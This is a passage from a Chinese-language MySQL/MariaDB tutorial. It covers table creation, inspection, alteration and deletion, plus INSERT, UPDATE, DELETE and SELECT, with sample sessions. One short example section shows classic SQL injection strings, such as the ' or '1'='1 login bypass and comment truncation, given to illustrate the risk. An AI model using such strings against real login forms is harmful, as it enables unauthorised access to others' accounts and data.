class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CREATE [TEMPORARY] TABLE [IF NOT EXISTS] tbl_name [(create_definition,...)] [table_options] [partition_options] select_statement<br></code></pre></td></tr></table></figure></blockquote><h5 id="范例：用法-1"><a href="#范例：用法-1" class="headerlink" title="范例：用法"></a>范例：用法</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost zabbix]&gt; create table userhost select user,host from mysql.user;<br>Query OK, 4 rows affected (0.01 sec)<br>Records: 4  Duplicates: 0  Warnings: 0<br></code></pre></td></tr></table></figure><h4 id="（3）-通过复制现存的表的表结构创建"><a href="#（3）-通过复制现存的表的表结构创建" class="headerlink" title="（3） 通过复制现存的表的表结构创建"></a>（3） 通过复制现存的表的表结构创建</h4><blockquote><p>不复制数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CREATE [TEMPORARY] TABLE [IF NOT EXISTS] tbl_name &#123; LIKE old_tbl_name | (LIKE old_tbl_name) &#125;<br></code></pre></td></tr></table></figure></blockquote><h5 id="范例：用法-2"><a href="#范例：用法-2" class="headerlink" title="范例：用法"></a>范例：用法</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost zabbix]&gt; create table user like student;<br>Query OK, 0 rows affected (0.01 sec)<br></code></pre></td></tr></table></figure><h3 id="5-2-show-表查看"><a href="#5-2-show-表查看" class="headerlink" title="5.2 show 表查看"></a>5.2 show 表查看</h3><h4 id="查看表"><a href="#查看表" class="headerlink" title="查看表"></a>查看表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW TABLES [FROM db_name]<br></code></pre></td></tr></table></figure><h4 id="查看表创建命令"><a href="#查看表创建命令" class="headerlink" title="查看表创建命令"></a>查看表创建命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW CREATE TABLE tbl_name<br></code></pre></td></tr></table></figure><h4 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#常用</span><br>DESC [db_name.]tb_name<br><br><span class="hljs-comment">#比较少用</span><br>SHOW COLUMNS FROM [db_name.]tb_name<br></code></pre></td></tr></table></figure><h4 id="查看表状态"><a href="#查看表状态" class="headerlink" title="查看表状态"></a>查看表状态</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#显示指定表的状态</span><br>SHOW TABLE STATUS LIKE <span class="hljs-string">&#x27;tbl_name&#x27;</span>\G<br><br><span class="hljs-comment">#查看库中所有表状态</span><br>SHOW TABLE STATUS FROM db_name<br></code></pre></td></tr></table></figure><h4 id="查看支持的engine类型"><a href="#查看支持的engine类型" class="headerlink" title="查看支持的engine类型"></a>查看支持的engine类型</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW ENGINES;<br></code></pre></td></tr></table></figure><h5 id="范例：用法-3"><a href="#范例：用法-3" class="headerlink" title="范例：用法"></a>范例：用法</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看表创建命令</span><br>[root@localhost zabbix]&gt; show create table student;<br>+---------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+<br>| Table   | Create Table                                         |<br>+---------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+<br>| student | CREATE TABLE `student` (<br>  `<span class="hljs-built_in">id</span>` tinyint unsigned NOT NULL AUTO_INCREMENT,<br>  `name` char(4) NOT NULL,<br>  `gender` char(1) DEFAULT NULL,<br>  `age` tinyint unsigned DEFAULT NULL,<br>  PRIMARY KEY (`<span class="hljs-built_in">id</span>`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci |<br>+---------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#查看表结构</span><br>[root@localhost zabbix]&gt; desc student;<br>+--------+------------------+------+-----+---------+----------------+<br>| Field  | Type             | Null | Key | Default | Extra          |<br>+--------+------------------+------+-----+---------+----------------+<br>| <span class="hljs-built_in">id</span>     | tinyint unsigned | NO   | PRI | NULL    | auto_increment |<br>| name   | char(4)          | NO   |     | NULL    |                |<br>| gender | char(1)          | YES  |     | NULL    |                |<br>| age    | tinyint unsigned | YES  |     | NULL    |                |<br>+--------+------------------+------+-----+---------+----------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#显示表的信息</span><br>[root@localhost zabbix]&gt; select * from student;<br>Empty <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#查看表状态</span><br>[root@localhost zabbix]&gt; SHOW TABLE STATUS LIKE <span class="hljs-string">&#x27;student&#x27;</span>\G<br>*************************** 1. row ***************************<br>           Name: student<br>         Engine: InnoDB<br>        Version: 10<br>     Row_format: Dynamic<br>           Rows: 0<br> Avg_row_length: 0<br>    Data_length: 16384<br>Max_data_length: 0<br>   Index_length: 0<br>      Data_free: 0<br> Auto_increment: 1<br>    Create_time: 2022-10-24 19:30:14<br>    Update_time: NULL<br>     Check_time: NULL<br>      Collation: utf8mb4_0900_ai_ci<br>       Checksum: NULL<br> Create_options:<br>        Comment:<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="5-3-修改和删除表"><a href="#5-3-修改和删除表" class="headerlink" title="5.3 修改和删除表"></a>5.3 修改和删除表</h3><h4 id="alter-修改表"><a href="#alter-修改表" class="headerlink" title="alter 修改表"></a>alter 修改表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">ALTER TABLE <span class="hljs-string">&#x27;tbl_name&#x27;</span><br><span class="hljs-comment">#字段：</span><br><span class="hljs-comment">#添加字段：add</span><br>ADD col1 data_type [FIRST|AFTER col_name] <br><span class="hljs-comment">#删除字段：drop</span><br><span class="hljs-comment">#修改字段：</span><br>alter（默认值）, change（字段名）, modify（字段属性）<br></code></pre></td></tr></table></figure><h4 id="drop-删除表"><a href="#drop-删除表" class="headerlink" title="drop 删除表"></a>drop 删除表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">DROP TABLE [IF EXISTS] <span class="hljs-string">&#x27;tbl_name&#x27;</span>;<br></code></pre></td></tr></table></figure><hr><h2 id="6-DML-语句"><a href="#6-DML-语句" class="headerlink" title="6 DML 语句"></a>6 DML 语句</h2><p>DML: INSERT, DELETE, UPDATE</p><h3 id="6-1-INSERT-语句"><a href="#6-1-INSERT-语句" class="headerlink" title="6.1 INSERT 语句"></a>6.1 INSERT 语句</h3><blockquote><p>功能：一次插入一行或多行数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#方法一</span><br>INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]<br>    [INTO] tbl_name [(col_name,...)]<br>    &#123;VALUES | VALUE&#125; (&#123;<span class="hljs-built_in">expr</span> | DEFAULT&#125;,...),(...),...<br>    [ ON DUPLICATE KEY UPDATE <span class="hljs-comment">#如果重复更新之</span><br>     col_name=<span class="hljs-built_in">expr</span><br>        [, col_name=<span class="hljs-built_in">expr</span>] ... ]<br><br><span class="hljs-comment">#方法二</span><br>INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]<br>    [INTO] tbl_name<br>    SET col_name=&#123;<span class="hljs-built_in">expr</span> | DEFAULT&#125;, ...<br>    [ ON DUPLICATE KEY UPDATE<br>     col_name=<span class="hljs-built_in">expr</span><br>        [, col_name=<span class="hljs-built_in">expr</span>] ... ]<br><br><span class="hljs-comment">#方法三</span><br>INSERT [LOW_PRIORITY | HIGH_PRIORITY] [IGNORE]<br>    [INTO] tbl_name [(col_name,...)]<br>    SELECT ...<br>    [ ON DUPLICATE KEY UPDATE<br>     col_name=<span class="hljs-built_in">expr</span><br>        [, col_name=<span class="hljs-built_in">expr</span>] ... ]<br></code></pre></td></tr></table></figure><p>简化写法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">INSERT tbl_name [(col1,...)] VALUES (val1,...), (val21,...)<br></code></pre></td></tr></table></figure></blockquote><h4 id="范例：用法-4"><a href="#范例：用法-4" class="headerlink" title="范例：用法"></a>范例：用法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#注：以下命令的into都可省略</span><br><span class="hljs-comment">#方法一：插入一条</span><br>[root@localhost zabbix]&gt; insert into student (<span class="hljs-built_in">id</span>,name,gender,age) values(1,<span class="hljs-string">&#x27;Rye&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,20);<br>Query OK, 1 row affected (0.00 sec)<br><br><span class="hljs-comment">#方法一：全部字段都需要赋值时可省略不写</span><br>[root@localhost zabbix]&gt; insert student values(1,<span class="hljs-string">&#x27;Rye&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,20);<br>Query OK, 1 row affected (0.00 sec)<br><br><span class="hljs-comment">#方法一：插入多条</span><br>[root@localhost zabbix]&gt; insert into student (name,gender,age) values(<span class="hljs-string">&#x27;Rye2&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,21),(<span class="hljs-string">&#x27;Rye3&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,22);<br>Query OK, 2 rows affected (0.00 sec)<br>Records: 2  Duplicates: 0  Warnings: 0<br><br><span class="hljs-comment">#方法二：插入一条</span><br>[root@localhost zabbix]&gt; insert into student <span class="hljs-built_in">set</span> name=<span class="hljs-string">&#x27;Rye4&#x27;</span>,gender=<span class="hljs-string">&#x27;F&#x27;</span>;<br>Query OK, 1 row affected (0.00 sec)<br><br><span class="hljs-comment">#方法三：复制表数据，前提表结构一致</span><br>[root@localhost zabbix]&gt; insert user select * from student;<br>Query OK, 4 rows affected (0.01 sec)<br>Records: 4  Duplicates: 0  Warnings: 0<br><br><span class="hljs-comment">#综上，查看</span><br>[root@localhost zabbix]&gt; select * from student;<br>+----+------+--------+------+<br>| <span class="hljs-built_in">id</span> | name | gender | age  |<br>+----+------+--------+------+<br>|  1 | Rye  | M      |   20 |<br>|  2 | Rye2 | M      |   21 |<br>|  3 | Rye3 | M      |   22 |<br>|  4 | Rye4 | F      | NULL |<br>+----+------+--------+------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="6-2-UPDATE-语句"><a href="#6-2-UPDATE-语句" class="headerlink" title="6.2 UPDATE 语句"></a>6.2 UPDATE 语句</h3><blockquote><p>语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">UPDATE [LOW_PRIORITY] [IGNORE] table_reference<br>    SET col_name1=&#123;expr1|DEFAULT&#125; [, col_name2=&#123;expr2|DEFAULT&#125;] ...<br>    [WHERE where_condition]<br>    [ORDER BY ...]<br>    [LIMIT row_count]<br></code></pre></td></tr></table></figure><p><strong>注意：一定要有限制条件，否则将修改所有行的指定字段</strong></p></blockquote><h4 id="范例：用法-5"><a href="#范例：用法-5" class="headerlink" title="范例：用法"></a>范例：用法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#用法</span><br>[root@localhost zabbix]&gt; update student <span class="hljs-built_in">set</span> age=23 <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=4;<br>Query OK, 1 row affected (0.00 sec)<br>Rows matched: 1  Changed: 1  Warnings: 0<br><br><span class="hljs-comment">#查看</span><br>[root@localhost zabbix]&gt; select * from student;<br>+----+------+--------+------+<br>| <span class="hljs-built_in">id</span> | name | gender | age  |<br>+----+------+--------+------+<br>|  1 | Rye  | M      |   20 |<br>|  2 | Rye2 | M      |   21 |<br>|  3 | Rye3 | M      |   22 |<br>|  4 | Rye4 | M      |   23 |<br>+----+------+--------+------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="6-3-DELETE-语句"><a href="#6-3-DELETE-语句" class="headerlink" title="6.3 DELETE 语句"></a>6.3 DELETE 语句</h3><blockquote><p>删除表中数据，但不会自动缩减数据文件的大小。</p><p>语法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">DELETE [LOW_PRIORITY] [QUICK] [IGNORE] FROM tbl_name<br>    [WHERE where_condition]<br>    [ORDER BY ...]<br>    [LIMIT row_count]<br><span class="hljs-comment">#可先排序再指定删除的行数</span><br></code></pre></td></tr></table></figure><p><strong>注意：一定要有限制条件，否则将清空表中的所有数据</strong></p><p>可利用mysql 选项避免此错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#方法一</span><br><span class="hljs-comment">#登陆时加如下参数（选一个即可）</span><br>mysql -U <br>mysql --safe-updates<br>mysql --i-am-a-dummy<br><br><span class="hljs-comment">#方法二</span><br>[root@rocky01 ~]<span class="hljs-comment"># vim /etc/my.cnf</span><br>[mysql]<br>safe-updates<br></code></pre></td></tr></table></figure></blockquote><p>如果想清空表，保留表结构，也可以使用下面语句，此语句会自动缩减数据文件的大小。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">TRUNCATE TABLE tbl_name;<br></code></pre></td></tr></table></figure><p><strong>缩减表大小</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">OPTIMIZE TABLE tb_name<br></code></pre></td></tr></table></figure><h4 id="范例：用法-6"><a href="#范例：用法-6" class="headerlink" title="范例：用法"></a>范例：用法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#用法</span><br>[root@localhost zabbix]&gt; delete from student <span class="hljs-built_in">where</span> age&gt;=21;<br>Query OK, 0 rows affected (0.00 sec)<br><br><span class="hljs-comment">#查看</span><br>[root@localhost zabbix]&gt; select * from student;<br>+----+------+--------+------+<br>| <span class="hljs-built_in">id</span> | name | gender | age  |<br>+----+------+--------+------+<br>|  1 | Rye  | M      |   20 |<br>+----+------+--------+------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><hr><h2 id="7-DQL-语句（select）"><a href="#7-DQL-语句（select）" class="headerlink" title="7 DQL 语句（select）"></a>7 DQL 语句（select）</h2><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221024235653104-2038438940.png"><img src="2927659-20221024235653104-2038438940.png" alt="img"></a></p><h3 id="7-1-单表操作"><a href="#7-1-单表操作" class="headerlink" title="7.1 单表操作"></a>7.1 单表操作</h3><blockquote><p>语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT<br> [ALL | DISTINCT | DISTINCTROW ]<br> [SQL_CACHE | SQL_NO_CACHE]<br> select_expr [, select_expr ...]<br>    [FROM table_references<br>    [WHERE where_condition]<br>    [GROUP BY &#123;col_name | <span class="hljs-built_in">expr</span> | position&#125;<br>      [ASC | DESC], ... [WITH ROLLUP]]<br>    [HAVING where_condition]<br>    [ORDER BY &#123;col_name | <span class="hljs-built_in">expr</span> | position&#125;<br>      [ASC | DESC], ...]<br>    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]<br>    [FOR UPDATE | LOCK IN SHARE MODE]<br></code></pre></td></tr></table></figure><p><strong>说明：</strong></p><ul><li><p>字段显示可以使用别名：</p></li><li><ul><li>col1 AS alias1, col2 AS alias2, …</li></ul></li><li><p><strong>WHERE子句</strong>：指明过滤条件以实现”选择”的功能：</p></li><li><ul><li>过滤条件：布尔型表达式</li><li>算术操作符：+, -, *, /, %</li><li>比较操作符：=,&lt;=&gt;（相等或都为空）, &lt;&gt;, !=(非标准SQL), &gt;, &gt;=, &lt;, &lt;=</li><li>范例查询: BETWEEN min_num AND max_num</li><li>不连续的查询: IN (element1, element2, …)</li><li>空查询: IS NULL, IS NOT NULL</li><li>DISTINCT 去除重复行，范例：SELECT DISTINCT gender FROM students;</li><li>模糊查询: LIKE 使用 % 表示任意长度的任意字符 _ 表示任意单个字符</li><li>RLIKE：正则表达式，索引失效，不建议使用</li><li>REGEXP：匹配字符串可用正则表达式书写模式，同上</li><li>逻辑操作符：NOT，AND，OR，XOR</li></ul></li><li><p><strong>GROUP BY：根据指定的条件把查询结果进行”分组”以用于做”聚合”运算</strong></p></li><li><ul><li><strong>常见聚合函数： count(), sum(), max(), min(), avg(),注意:聚合函数不对null统计</strong></li><li><strong>HAVING: 对分组聚合运算后的结果指定过滤条件</strong></li><li><strong>一旦分组 group by ，select语句后只跟分组的字段，聚合函数</strong></li></ul></li><li><p><strong>ORDER BY: 根据指定的字段对查询结果进行排序</strong></p></li><li><ul><li><strong>升序：ASC</strong></li><li><strong>降序：DESC</strong></li></ul></li><li><p><strong>LIMIT</strong> [[offset,]row_count]：对查询的结果进行输出行数数量限制,跳过offset,显示row_count行,offset默为值为0</p></li><li><p>对查询结果中的数据请求施加”锁”</p></li><li><ul><li>FOR UPDATE: 写锁，独占或排它锁，只有一个读和写操作</li><li>LOCK IN SHARE MODE: 读锁，共享锁，同时多个读操作</li></ul></li></ul></blockquote><h4 id="范例：字段别名"><a href="#范例：字段别名" class="headerlink" title="范例：字段别名"></a>范例：字段别名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [hellodb]&gt; select stuid 学员ID,name as 姓名,gender 性别 from students;<br>+----------+---------------+--------+<br>| 学员ID   | 姓名          | 性别   |<br>+----------+---------------+--------+<br>|        1 | Shi Zhongyu   | M      |<br>|        2 | Shi Potian    | M      |<br>|        3 | Xie Yanke     | M      |<br>|        4 | Ding Dian     | M      |<br>|        5 | Yu Yutong     | M      |<br></code></pre></td></tr></table></figure><h4 id="范例：判断是否为NULL"><a href="#范例：判断是否为NULL" class="headerlink" title="范例：判断是否为NULL"></a>范例：判断是否为NULL</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [hellodb]&gt; select * from students <span class="hljs-built_in">where</span> classid is null;<br>+-------+-------------+-----+--------+---------+-----------+<br>| StuID | Name        | Age | Gender | ClassID | TeacherID |<br>+-------+-------------+-----+--------+---------+-----------+<br>|    24 | Xu Xian     |  27 | M      |    NULL |      NULL |<br>|    25 | Sun Dasheng | 100 | M      |    NULL |      NULL |<br>+-------+-------------+-----+--------+---------+-----------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.002 sec)<br><br><br>MariaDB [hellodb]&gt; select * from students <span class="hljs-built_in">where</span> classid is not null;<br></code></pre></td></tr></table></figure><h4 id="范例：去重"><a href="#范例：去重" class="headerlink" title="范例：去重"></a>范例：去重</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [hellodb]&gt; select distinct gender from students ;<br>+--------+<br>| gender |<br>+--------+<br>| M      |<br>| F      |<br>+--------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br><br><span class="hljs-comment">#将age和gender多个字段重复的记录去重</span><br>MariaDB [hellodb]&gt; select distinct age,gender from students;<br></code></pre></td></tr></table></figure><h4 id="范例：SQL-注入攻击"><a href="#范例：SQL-注入攻击" class="headerlink" title="范例：SQL 注入攻击"></a>范例：SQL 注入攻击</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">select * from user <span class="hljs-built_in">where</span> name=<span class="hljs-string">&#x27;admin&#x27;</span> and password=<span class="hljs-string">&#x27;&#x27;</span> or <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>;<br>select * from user <span class="hljs-built_in">where</span> name=<span class="hljs-string">&#x27;admin&#x27;</span> and password=<span class="hljs-string">&#x27;&#x27;</span> or <span class="hljs-string">&#x27;1=1&#x27;</span>;<br>select * from user <span class="hljs-built_in">where</span> name=<span class="hljs-string">&#x27;admin&#x27;</span>; -- <span class="hljs-string">&#x27; and password=&#x27;</span>123<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">select * from user where name=&#x27;</span>admin<span class="hljs-string">&#x27;; # &#x27;</span> and password=<span class="hljs-string">&#x27;123&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="范例：分页查询"><a href="#范例：分页查询" class="headerlink" title="范例：分页查询"></a>范例：分页查询</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#只取前3个</span><br>mysql&gt; select * from students <span class="hljs-built_in">limit</span> 0,3;<br>mysql&gt; select * from students <span class="hljs-built_in">limit</span> 3;<br>+-------+-------------+-----+--------+---------+-----------+<br>| StuID | Name       | Age | Gender | ClassID | TeacherID |<br>+-------+-------------+-----+--------+---------+-----------+<br>|     1 | Shi Zhongyu |  22 | M     |       2 |         3 |<br>|     2 | Shi Potian |  22 | M     |       1 |         7 |<br>|     3 | Xie Yanke   |  53 | M     |       2 |        16 |<br>+-------+-------------+-----+--------+---------+-----------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#跳过第一个之后，取前三个</span><br>mysql&gt; select * from students <span class="hljs-built_in">limit</span> 1,3;<br>+-------+------------+-----+--------+---------+-----------+<br>| StuID | Name       | Age | Gender | ClassID | TeacherID |<br>+-------+------------+-----+--------+---------+-----------+<br>|     2 | Shi Potian |  22 | M     |       1 |         7 |<br>|     3 | Xie Yanke |  53 | M     |       2 |        16 |<br>|     4 | Ding Dian |  32 | M     |       4 |         4 |<br>+-------+------------+-----+--------+---------+-----------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h4 id="范例：聚合函数"><a href="#范例：聚合函数" class="headerlink" title="范例：聚合函数"></a>范例：聚合函数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; select <span class="hljs-built_in">sum</span>(age)/count(*) from students <span class="hljs-built_in">where</span> gender =<span class="hljs-string">&#x27;M&#x27;</span>;<br>+-------------------+<br>| <span class="hljs-built_in">sum</span>(age)/count(*) |<br>+-------------------+<br>|           33.0000 |<br>+-------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h4 id="范例：分组统计"><a href="#范例：分组统计" class="headerlink" title="范例：分组统计"></a>范例：分组统计</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 